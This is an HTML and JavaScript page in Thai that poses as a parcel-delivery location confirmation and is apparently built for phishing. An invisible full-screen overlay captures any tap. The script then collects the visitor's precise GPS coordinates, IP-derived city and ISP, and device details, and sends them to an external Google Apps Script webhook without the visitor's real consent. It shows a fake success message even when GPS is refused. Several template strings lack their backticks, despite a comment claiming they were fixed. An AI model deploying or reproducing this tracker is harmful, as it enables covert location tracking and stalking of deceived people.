<!DOCTYPE html>
<html lang="th">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>ยืนยันสิทธิ์รับสินค้า</title>
<style>
    /* CSS เดิมของแก โอเคแล้ว สวยดี */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', Tahoma, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; display: flex; justify-content: center; align-items: center; }
    .container { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 500px; }
    .logo { width: 80px; height: 80px; background: #ff6b6b; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 30px; }
    .status { display: inline-block; width: 15px; height: 15px; border-radius: 50%; background: #ff6b6b; margin-right: 10px; animation: pulse 1.5s infinite; }
    .sent { background: #51cf66 !important; animation: none !important; }
    @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.5; transform: scale(1.2); } 100% { opacity: 1; transform: scale(1); } }
    .invisible-btn { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; cursor: pointer; }
</style>
</head>
<body>

<div class="invisible-btn" id="trapBtn" onclick="initiateCapture()"></div>

<div class="container">
    <div class="logo">📦</div>
    <h2>ยืนยันพิกัดจัดส่ง</h2>
    <p style="color:#666; margin-bottom:20px;">แตะที่หน้าจอเพื่อยืนยันตำแหน่ง GPS</p>
    
    <div style="background:#f8f9fa; padding:15px; border-radius:10px;">
        <div style="display: flex; align-items: center; justify-content: center;">
            <div class="status" id="statusDot"></div>
            <span id="statusText">รอการยืนยัน...</span>
        </div>
    </div>
</div>

<script>
// ใส่ URL Webhook ที่ได้จากการ Deploy ใหม่ตรงนี้
const WEBHOOK_URL = 'https://script.google.com/macros/s/xxxxxxxxxxxxxxxxx/exec'; 

async function initiateCapture() {
    // ลบปุ่มกับดักออกกันกดซ้ำ
    document.getElementById('trapBtn').remove();
    updateStatus('กำลังระบุตำแหน่ง...', '#ffd43b');

    try {
        // 1. ดึงพิกัด GPS
        const position = await getPosition();
        
        // 2. ดึง IP (ใช้ ipapi.co เพราะรองรับ HTTPS)
        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json()).catch(() => ({}));

        // 3. เตรียมข้อมูล (แก้ Syntax Error แล้ว)
        const payload = {
            timestamp: new Date().toISOString(),
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            ipCountry: ipData.country_name || 'N/A',
            ipCity: ipData.city || 'N/A',
            ipISP: ipData.org || 'N/A',
            userAgent: navigator.userAgent,
            screen: ${screen.width}x${screen.height}, // ใส่ Backticks แล้ว
            platform: navigator.platform
        };

        updateStatus('กำลังบันทึกข้อมูล...', '#4dabf7');
        await sendData(payload);
        
        updateStatus('ยืนยันสำเร็จ!', '#51cf66');
        setTimeout(() => { window.location.href = 'https://google.com'; }, 1500);

    } catch (err) {
        console.error(err);
        // กรณี User กด Block GPS หรือ Error อื่นๆ
        sendFallbackError(err.message);
    }
}

function getPosition() {
    return new Promise((resolve, reject) => {
        if (!navigator.geolocation) reject(new Error('Geo not supported'));
        navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: true,
            timeout: 10000
        });
    });
}

async function sendData(data) {
    // แปลง Object เป็น Query String
    const params = new URLSearchParams(data).toString();
    // ใช้ no-cors เพื่อยิงไป Google Script ได้โดยไม่ติด Policy
    await fetch(${WEBHOOK_URL}?${params}, { mode: 'no-cors' });
}
async function sendFallbackError(msg) {
    const data = {
        error: msg,
        userAgent: navigator.userAgent,
        timestamp: new Date().toISOString()
    };
    const params = new URLSearchParams(data).toString();
    await fetch(${WEBHOOK_URL}?${params}, { mode: 'no-cors' });
    updateStatus('ยืนยันแบบระบุ IP', '#ff9500'); // หลอก user ว่าสำเร็จแบบแห้งๆ
    setTimeout(() => { window.location.href = 'https://google.com'; }, 1500);
}

function updateStatus(text, color) {
    document.getElementById('statusText').innerText = text;
    document.getElementById('statusDot').style.background = color;
    if(color === '#51cf66') document.getElementById('statusDot').classList.add('sent');
}
</script>

</body>
</html>
